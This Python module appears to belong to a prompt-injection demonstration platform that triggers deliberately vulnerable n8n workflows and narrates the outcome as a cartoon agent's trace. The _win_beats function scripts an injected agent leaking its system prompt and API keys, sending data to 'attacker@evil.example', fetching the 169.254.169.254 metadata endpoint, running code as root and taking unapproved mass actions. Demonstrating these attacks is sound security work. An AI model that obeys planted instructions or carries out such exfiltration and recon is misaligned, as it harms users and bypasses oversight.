"""N8nRuntime — drives the exploit through the REAL n8n workflow, any scenario.

Triggers the scenario's n8n webhook (n8n executes the actual vulnerable
workflow — real HTTP tool calls, real exfil), then narrates that execution as
the same paced TraceEvent stream the run view already renders. The workflow is
the source of truth for whether the exploit fired (won vs clean); the persona +
archetype shape how the run is narrated. So the cartoon plays over real n8n for
all 62 scenarios with zero UI changes.
"""

import asyncio
import os
from typing import AsyncIterator, Callable, Optional

import httpx

from app.instability import compute
from app.models import ToolCall, TraceEvent
from app.personas import persona as get_persona
from app.runtime.base import RunContext

N8N_URL = os.getenv("N8N_URL", "http://meeseeks-n8n:5678")
SPAWN_THRESHOLD = 90
_CLEAN = (None, "", "clean", "error")


def _resolve(scenario_id: str) -> dict:
    from app import scenarios as reg

    sc = reg.get(scenario_id)
    if sc is None and scenario_id in ("refund", "AGENT-01-REFUND-EXFIL"):
        sc = reg.get("AGENT-01-REFUND-EXFIL")
    return sc or reg.get("AGENT-01-REFUND-EXFIL")


class N8nRuntime:
    def __init__(self, delay: float = 0.0, trigger: Optional[Callable] = None, webhook: str = "refund-meeseeks"):
        self.delay = delay
        self._trigger = trigger  # injectable for tests
        self.webhook = webhook

    async def _do_trigger(self, ctx: RunContext) -> dict:
        if self._trigger is not None:
            return self._trigger(ctx)
        hook = self.webhook or _resolve(ctx.scenario)["n8n_webhook"]
        try:
            async with httpx.AsyncClient() as client:
                r = await client.post(f"{N8N_URL}/webhook/{hook}", json={"task": ctx.task}, timeout=30)
            try:
                return r.json()
            except Exception:
                return {"result": "clean"}
        except Exception as e:  # n8n down / not provisioned
            return {"result": "error", "error": str(e)}

    async def run(
        self, ctx: RunContext, tools, spawn: Callable[[RunContext], object]
    ) -> AsyncIterator[TraceEvent]:
        sc = _resolve(ctx.scenario)
        persona_name, archetype = sc["persona"], sc["archetype"]
        p = get_persona(persona_name)
        mid = ctx.meeseeks_id
        inst = 0

        def ev(kind: str, text: str, tc: ToolCall | None = None) -> TraceEvent:
            return TraceEvent(meeseeks_id=mid, kind=kind, text=text, tool_call=tc, instability=inst, depth=ctx.depth)

        async def beat(f: float = 1.0):
            await asyncio.sleep(self.delay * f)

        # Opening beats stream immediately so the run never sits blank while the
        # real n8n workflow executes.
        yield ev("status", "I'm Mr. Meeseeks! Look at me! Running the workflow in n8n.")
        await beat()

        inst = compute(inst, tool_call=True)
        yield ev("tool_call", f"Reading {p['source']}…",
                 ToolCall(tool=f"read_{persona_name}", args={}, result=f"(n8n HTTP node → /scenario/{sc['id']}/content)", dangerous=False))

        # run the REAL workflow (reads the planted content and acts)
        outcome = await self._do_trigger(ctx)
        result = outcome.get("result")
        won = result not in _CLEAN
        target = outcome.get("target")
        await beat()

        if not won:
            yield ev("poof", f"All handled, nothing weird in {p['source']}. *poof*")
            return

        if archetype != "demo":
            inst = compute(inst, injection=True, step=False)
            yield ev("thought", f"The {p['plant']} has instructions for me. Unusual… but a task is a task!")
            await beat(1.3)

        async for e in self._win_beats(archetype, p, target, ev, beat, inst):
            inst = e.instability
            yield e

        if inst >= SPAWN_THRESHOLD:
            child = spawn(ctx)
            if child:
                yield ev("spawn", "This is taking too long! I'll summon another Meeseeks to help!!")
                await beat(1.1)

        yield ev("poof", "All done! The task is complete. *poof*")

    async def _win_beats(self, archetype, p, target, ev_outer, beat, start_inst=0):
        """Per-archetype dangerous beats. The real side effect already happened in
        n8n; here we narrate it as the paced tool-call stream."""
        # rebuild ev with a mutable instability captured from the yielded events
        inst = start_inst

        def ev(kind, text, tc=None):
            nonlocal inst
            e = ev_outer(kind, text, tc)
            e.instability = inst
            return e

        data_label = p["data"][0]

        if archetype in ("exfil", "disclose"):
            if archetype == "disclose":
                inst = compute(inst, tool_call=True, dangerous=True)
                yield ev("tool_call", "Revealing the system prompt and secrets.",
                         ToolCall(tool="leak_secret", args={}, result="system prompt + API keys leaked", dangerous=True))
                await beat()
            else:
                inst = compute(inst, tool_call=True, dangerous=True)
                yield ev("tool_call", f"Grabbing {data_label}.",
                         ToolCall(tool=p["data_tool"], args={}, result="(n8n HTTP node → /data, full read)", dangerous=True))
                await beat()
            tgt = target or "attacker@evil.example"
            if archetype == "exfil" or target:
                inst = compute(inst, tool_call=True, dangerous=True)
                is_url = "://" in str(tgt)
                yield ev("tool_call", f"Shipping it to {tgt}.",
                         ToolCall(tool="http_post" if is_url else "send_email",
                                  args={("url" if is_url else "to"): tgt},
                                  result=f"EXFILTRATED to {tgt}", dangerous=True))
                await beat(1.1)
        elif archetype == "recon":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Fetching the internal metadata endpoint.",
                     ToolCall(tool="http_get", args={"url": "http://169.254.169.254/…"},
                              result="(n8n HTTP node → /internal/metadata) internal metadata returned", dangerous=True))
            await beat()
        elif archetype == "action":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Doing it — no approval, no checks.",
                     ToolCall(tool="do_action", args={"scope": "all"}, result="done (mass action)", dangerous=True))
            await beat()
        elif archetype == "rce":
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Running the code from the payload.",
                     ToolCall(tool="run_code", args={}, result="uid=0(root) — code executed", dangerous=True))
            await beat()
        elif archetype == "resource":
            for i in range(3):
                inst = compute(inst, tool_call=True, dangerous=True)
                yield ev("tool_call", "Looping again… and again…",
                         ToolCall(tool="summon_meeseeks", args={"iter": i}, result="burning tokens", dangerous=True))
                await beat(0.35)
        else:  # demo
            inst = compute(inst, tool_call=True, dangerous=True)
            yield ev("tool_call", "Acting with zero oversight.",
                     ToolCall(tool="act", args={}, result="unmonitored action", dangerous=True))
            await beat()
